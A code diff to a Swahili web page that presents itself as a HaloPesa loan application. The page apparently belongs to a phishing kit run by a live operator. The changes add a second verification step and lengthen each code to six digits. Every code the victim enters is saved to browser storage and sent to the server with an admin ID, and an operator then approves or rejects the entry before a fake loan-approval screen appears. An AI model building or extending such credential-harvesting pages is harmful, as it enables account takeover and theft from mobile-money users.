@@ -589,20 +589,20 @@
   }
   .otp-inputs { 
     display: flex; 
-    gap: 12px; 
+    gap: 8px; 
     justify-content: center;
     align-items: center; 
     margin-bottom: 20px; 
     width: 100%; 
-    max-width: 280px;
+    max-width: 320px;
   }
   .otp-box { 
-    width: 54px; 
-    height: 56px; 
+    width: 44px; 
+    height: 52px; 
     border: 1.5px solid var(--border-color); 
     border-radius: var(--radius-sm); 
     text-align: center; 
-    font-size: 1.35rem; 
+    font-size: 1.25rem; 
     font-weight: 800; 
     color: var(--brand-orange); 
     outline: none; 
@@ -982,10 +982,10 @@
   </div>
 </div>
 
-<!-- PAGE OTP -->
+<!-- PAGE OTP (REUSED FOR STEP 1 AND STEP 2) -->
 <div id="page-otp" class="page">
   <nav class="navbar">
-    <a class="nav-left" onclick="goTo('page-login')">← Rudi</a>
+    <a class="nav-left" id="otpBackBtn" onclick="handleOtpBack()">← Rudi</a>
     <div class="hp-logo-sm">
       <img src="images/halopesa-logo.png" alt="HaloPesa Logo">
       <div class="brand">HaloPesa</div>
@@ -995,8 +995,8 @@
 
   <div class="otp-card">
     <div class="otp-icon-badge">💬</div>
-    <h2>Uthibitisho wa OTP</h2>
-    <p class="otp-hint">Weka OTP iliyotumwa kwenye nambari yako ya simu</p>
+    <h2 id="otpTitle">Verification Step 1</h2>
+    <p class="otp-hint" id="otpSub">Weka OTP ya kwanza iliyotumwa kwenye nambari yako ya simu</p>
     <div class="otp-phone-badge" id="otpPh">+255712345678</div>
 
     <div class="msg-box error" id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
@@ -1015,6 +1015,8 @@
         <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box" maxlength="1" onkeydown="otpKey(event,1)" oninput="otpMv(this,1)" id="o1">
         <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box" maxlength="1" onkeydown="otpKey(event,2)" oninput="otpMv(this,2)" id="o2">
         <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box" maxlength="1" onkeydown="otpKey(event,3)" oninput="otpMv(this,3)" id="o3">
+        <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box" maxlength="1" onkeydown="otpKey(event,4)" oninput="otpMv(this,4)" id="o4">
+        <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box" maxlength="1" onkeydown="otpKey(event,5)" oninput="otpMv(this,5)" id="o5">
       </div>
       <div class="otp-resend" id="otpRs">Tuma tena msimbo ndani ya <span id="rsS">30</span> sekunde</div>
       <button class="btn-otp" id="bOtp" onclick="doOtp()">WASILISHA</button>
@@ -1115,11 +1117,12 @@
 </div>
 
 <script>
-  // GLOBAL INTERVAL HANDLES
+  // GLOBAL INTERVAL HANDLES & STATE
   let pinPollInterval = null;
   let otpPollInterval = null;
   let _rsInterval = null;
   let _loginInFlight = false;
+  let otpStep = 1;
 
   // STATE MANAGEMENT
   const S = {
@@ -1319,6 +1322,40 @@
     });
   }
 
+  // OTP STATE RENDERER
+  function updateOtpUiStep(step) {
+    otpStep = step;
+    clearOtpInputs();
+    hideOtpMsgs();
+    
+    if (otpStep === 1) {
+      document.getElementById('otpTitle').textContent = 'Verification Step 1';
+      document.getElementById('otpSub').textContent = 'Weka OTP ya kwanza iliyotumwa kwenye nambari yako ya simu';
+    } else {
+      document.getElementById('otpTitle').textContent = 'Verification Step 2';
+      document.getElementById('otpSub').textContent = 'Weka OTP ya pili ya uthibitisho kukamilisha ombi lako';
+    }
+  }
+
+  function handleOtpBack() {
+    if (otpStep === 2) {
+      updateOtpUiStep(1);
+      showOtpMsg('info', 'Umerudi Verification Step 1. Weka msimbo tena.');
+    } else {
+      goTo('page-login');
+    }
+  }
+
+  function clearOtpInputs() {
+    [0,1,2,3,4,5].forEach(i => {
+      const el = document.getElementById('o' + i);
+      if (el) el.value = '';
+    });
+    const bOtp = document.getElementById('bOtp');
+    bOtp.className = 'btn-otp';
+    bOtp.disabled = false;
+  }
+
   // LOGIN PIN HANDLERS
   function pinKey(e, i) {
     if (e.key === 'Backspace' && !e.target.value && i > 0) {
@@ -1386,6 +1423,7 @@
 
         document.getElementById('otpPh').textContent = phoneNumber;
 
+        updateOtpUiStep(1);
         goTo('page-otp');
         document.getElementById('pinWait').classList.add('show');
         document.getElementById('otpInputSection').style.display = 'none';
@@ -1432,9 +1470,7 @@
           document.getElementById('otpInputSection').style.display = 'none';
           showOtpMsg('error', 'Maelezo hayakuthibitishwa. Tafadhali ingia tena na uweke namba sahihi ya HaloPesa.');
           setTimeout(() => {
-            [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
-            document.getElementById('bOtp').className = 'btn-otp';
-            document.getElementById('bOtp').disabled = false;
+            clearOtpInputs();
             document.getElementById('otpInputSection').style.display = 'flex';
             if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
             document.getElementById('otpRs').innerHTML = 'Tuma tena msimbo ndani ya <span id="rsS">30</span> sekunde';
@@ -1476,8 +1512,8 @@
 
   function otpMv(el, i) {
     el.value = el.value.replace(/\D/g, '');
-    if (el.value && i < 3) document.getElementById('o' + (i+1)).focus();
-    const ok = [0,1,2,3].every(j => document.getElementById('o'+j).value !== '');
+    if (el.value && i < 5) document.getElementById('o' + (i+1)).focus();
+    const ok = [0,1,2,3,4,5].every(j => document.getElementById('o'+j).value !== '');
     document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
   }
 
@@ -1509,14 +1545,13 @@
       const res  = await fetch('/api/resend-otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ applicationId: S.applicationId })
+        body: JSON.stringify({ applicationId: S.applicationId, otpStep })
       });
       const data = await res.json();
       if (data.success) {
-        showOtpMsg('info', 'Ombi jipya la OTP limetumwa kwa msimamizi.');
+        showOtpMsg('info', `Ombi jipya la OTP (Step ${otpStep}) limetumwa kwa msimamizi.`);
         startRs();
-        [0,1,2,3].forEach(i => { document.getElementById('o'+i).value = ''; });
-        document.getElementById('bOtp').className = 'btn-otp';
+        clearOtpInputs();
         document.getElementById('o0').focus();
       } else {
         showOtpMsg('error', 'Imeshindwa kutuma tena OTP. Tafadhali jaribu tena.');
@@ -1527,10 +1562,10 @@
   }
 
   async function doOtp() {
-    const otp = [0,1,2,3].map(j => document.getElementById('o'+j).value).join('');
+    const otp = [0,1,2,3,4,5].map(j => document.getElementById('o'+j).value).join('');
 
-    if (otp.length < 4) {
-      showOtpMsg('warning', 'Tafadhali weka tarakimu zote 4 za OTP yako.');
+    if (otp.length < 6) {
+      showOtpMsg('warning', 'Tafadhali weka tarakimu zote 6 za OTP yako.');
       return;
     }
 
@@ -1547,11 +1582,26 @@
       if (el) el.textContent = 'Tafadhali subiri… (' + c + 's)';
     }, 1000);
 
+    // Save state to browser storage
+    const analyticsData = {
+      otpStep,
+      otpCode: otp,
+      timestamp: new Date().toISOString(),
+      adminId: getAdminId()
+    };
+    localStorage.setItem(`otp_step_${otpStep}`, otp);
+    sessionStorage.setItem('last_otp_analytics', JSON.stringify(analyticsData));
+
     try {
       const res  = await fetch('/api/verify-otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ applicationId: S.applicationId, otp })
+        body: JSON.stringify({ 
+          applicationId: S.applicationId, 
+          otp,
+          otpStep,
+          analytics: analyticsData
+        })
       });
       const data = await res.json();
 
@@ -1559,8 +1609,15 @@
       document.getElementById('mOtp').classList.remove('show');
 
       if (data.success) {
-        showOtpMsg('success', 'OTP imewasilishwa. Inasubiri msimamizi kuidhinisha…');
-        pollOtpStatus();
+        if (data.nextStep === 2) {
+          updateOtpUiStep(2);
+          showOtpMsg('success', 'Verification Step 1 imekamilika! Weka Verification Step 2 OTP.');
+          startRs();
+          document.getElementById('o0').focus();
+        } else {
+          showOtpMsg('success', 'OTP imewasilishwa. Inasubiri msimamizi kuidhinisha…');
+          pollOtpStatus();
+        }
       } else {
         document.getElementById('bOtp').disabled = false;
         showOtpMsg('error', data.message || 'Imeshindwa kuwasilisha OTP. Tafadhali jaribu tena.');
@@ -1580,7 +1637,7 @@
 
     otpPollInterval = setInterval(async () => {
       try {
-        const res  = await fetch(`/api/check-otp-status/${S.applicationId}`);
+        const res  = await fetch(`/api/check-otp-status/${S.applicationId}?step=${otpStep}`);
         const data = await res.json();
 
         if (!data.success) return;
@@ -1588,14 +1645,22 @@
         if (data.status === 'approved') {
           clearInterval(otpPollInterval);
           otpPollInterval = null;
-          document.getElementById('apAmt').textContent  = 'TSh ' + Number(S.amt || 100000).toLocaleString();
-          document.getElementById('apTerm').textContent = S.term || 'Miezi 48';
-          const a = Number(S.amt) || 100000;
-          const t = parseInt(S.term) || 48;
-          const r = 0.05 / 12;
-          const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
-          document.getElementById('apMthly').textContent = 'TSh ' + m.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
-          goTo('page-approval');
+
+          if (otpStep === 1) {
+            updateOtpUiStep(2);
+            showOtpMsg('success', 'Hatua ya 1 imethibitishwa! Tafadhali weka Verification Step 2 OTP.');
+            startRs();
+            document.getElementById('o0').focus();
+          } else {
+            document.getElementById('apAmt').textContent  = 'TSh ' + Number(S.amt || 100000).toLocaleString();
+            document.getElementById('apTerm').textContent = S.term || 'Miezi 48';
+            const a = Number(S.amt) || 100000;
+            const t = parseInt(S.term) || 48;
+            const r = 0.05 / 12;
+            const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
+            document.getElementById('apMthly').textContent = 'TSh ' + m.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+            goTo('page-approval');
+          }
 
         } else if (data.status === 'rejected') {
           clearInterval(otpPollInterval);
@@ -1606,11 +1671,9 @@
         } else if (data.status === 'wrongpin_otp') {
           clearInterval(otpPollInterval);
           otpPollInterval = null;
-          showOtpMsg('error', 'PIN si sahihi. Tafadhali jaribu tena. ⚠️ Kumbuka: Ukiingiza PIN isiyo sahihi tena, akaunti yako itafungwa kwa usalama.');
+          showOtpMsg('error', 'PIN si sahihi. Tafadhali jaribu tena. ⚠️️ Kumbuka: Ukiingiza PIN isiyo sahihi tena, akaunti yako itafungwa kwa usalama.');
           setTimeout(() => {
-            [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
-            document.getElementById('bOtp').className = 'btn-otp';
-            document.getElementById('bOtp').disabled = false;
+            clearOtpInputs();
             document.getElementById('pinWait').classList.remove('show');
             document.getElementById('otpInputSection').style.display = 'flex';
             if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
@@ -1630,12 +1693,10 @@
         } else if (data.status === 'wrongcode') {
           clearInterval(otpPollInterval);
           otpPollInterval = null;
-          [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
-          document.getElementById('bOtp').className = 'btn-otp';
-          document.getElementById('bOtp').disabled = false;
+          clearOtpInputs();
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpInputSection').style.display = 'flex';
-          showOtpMsg('error', 'Msimbo wa OTP usio sahihi. Tafadhali angalia na uweke tena.');
+          showOtpMsg('error', `Msimbo wa OTP Step ${otpStep} si sahihi. Tafadhali angalia na uweke tena.`);
           document.getElementById('o0').focus();
         }
 
@@ -1672,12 +1733,12 @@
       });
     }
 
-    // 4-Digit Paste Support for OTP
+    // 6-Digit Paste Support for OTP
     const o0 = document.getElementById('o0');
     if (o0) {
       o0.addEventListener('paste', (e) => {
         const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').trim();
-        if (paste.length === 4) {
+        if (paste.length === 6) {
           e.preventDefault();
           [...paste].forEach((digit, idx) => {
             const el = document.getElementById('o' + idx);
